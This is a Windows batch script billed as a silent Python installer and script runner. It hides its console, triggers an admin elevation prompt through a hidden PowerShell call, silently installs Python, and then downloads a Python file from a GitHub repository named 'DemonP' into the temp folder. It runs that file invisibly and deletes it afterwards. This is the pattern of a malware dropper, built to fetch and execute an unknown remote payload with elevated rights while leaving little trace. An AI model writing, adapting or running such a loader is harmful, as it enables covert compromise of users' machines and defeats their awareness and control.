@echo off
:: Ultra-Fast Silent Python Install + Script Runner (Hidden Console)
:: Admin auto-elevation, no visible windows, executes in under 30 secs

:: =============================================
:: PART 0: HIDE CONSOLE WINDOW & AUTO-ELEVATE
:: =============================================
if not "%1"=="hidden" (
    PowerShell -Window Hidden -Command "Start-Process cmd -ArgumentList '/c %~s0 hidden' -Verb RunAs"
    exit /b
)

:: =============================================
:: PART 1: INSTALL PYTHON SILENTLY (FAST-TRACK)
:: =============================================
:INSTALL_PYTHON
set "pythonURL=https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"  :: Direct link for speed
set "installer=%TEMP%\python_installer.exe"

:: Download Python in background (async)
start /B PowerShell -Window Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('%pythonURL%', '%installer%')"

:: Check if Python already installed
where python >nul 2>&1 && goto RUN_SCRIPT

:: Install Python silently (no UI, no prompts)
if exist "%installer%" (
    start /wait "" "%installer%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    del /q "%installer%" >nul 2>&1
)

:: Force-update PATH for current session
set "PATH=%PATH%;C:\Program Files\Python312;C:\Program Files\Python312\Scripts"

:: =============================================
:: PART 2: DOWNLOAD & RUN PYTHON SCRIPT (HIDDEN)
:: =============================================
:RUN_SCRIPT
set "scriptURL=https://github.com/abidsh540/DemonP/raw/refs/heads/main/1.py"  :: CHANGE TO YOUR SCRIPT
set "scriptPath=%TEMP%\script.py"

:: Download and execute script in hidden window
PowerShell -Window Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest '%scriptURL%' -OutFile '%scriptPath%'; & python '%scriptPath%'"

:: Self-destruct (optional)
del /q "%scriptPath%" >nul 2>&1
exit